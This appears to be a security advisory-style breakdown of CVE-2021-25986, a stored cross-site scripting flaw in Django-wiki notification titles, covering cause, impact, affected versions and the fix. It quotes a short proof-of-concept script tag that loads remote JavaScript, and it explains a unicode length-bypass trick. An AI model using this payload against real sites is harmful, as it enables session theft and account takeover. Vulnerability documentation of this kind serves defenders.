Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2021-25986

**Root Cause:** The vulnerability stems from a lack of proper sanitization of user-supplied input in the title field of Django-wiki pages. Specifically, HTML is not escaped before being rendered in notification messages.

**Weakness/Vulnerability:**
*   **Stored Cross-Site Scripting (XSS):** Malicious JavaScript code injected into the title field is stored in the application's database. When this stored data is displayed as part of a notification, the injected script executes in the context of the user's browser.

**Impact of Exploitation:**
*   An attacker can inject malicious JavaScript into the notification panel that is triggered when a user receives a notification about a change to a page.
*   The malicious script executes when a victim views the notification, potentially allowing the attacker to:
    *   Steal session cookies or other sensitive information.
    *   Redirect the victim to a malicious website.
    *   Perform actions on behalf of the victim.
    *   Deface the application.

**Attack Vectors:**
*   The attack vector is through the application's web interface. An attacker needs to have permissions to edit pages within Django-wiki.

**Required Attacker Capabilities/Position:**
*   The attacker needs to have an account with privileges to edit pages within the Django-wiki application.
*   The attacker injects the malicious payload via the title field when editing a page.
*   The attacker has no direct control over when a victim will receive the notification, but they control the content of the notification.

**Technical Details:**
*   The vulnerability occurs in the notification section of the application.
*   The injected JavaScript payload is triggered when a user (e.g., an admin) receives a notification about the changes made by the attacker.
*   The payload is limited to 25 characters because of title truncation and includes the use of the unicode character “℡” to bypass the length limitation.
*   The payload shown in the PoC is: `<script src=//℡z.in/a.js>`

**Affected Versions:**
*   Django-wiki versions 0.0.20 through 0.7.8 are vulnerable.

**Fix:**
*   The vulnerability is fixed in version 0.7.9 and later. The fix involves sanitizing HTML characters in titles before they are displayed in notifications.
*   The fix was implemented in this commit: `9eaccc7519e4206a4d2f22640882f0737b2da9c5`
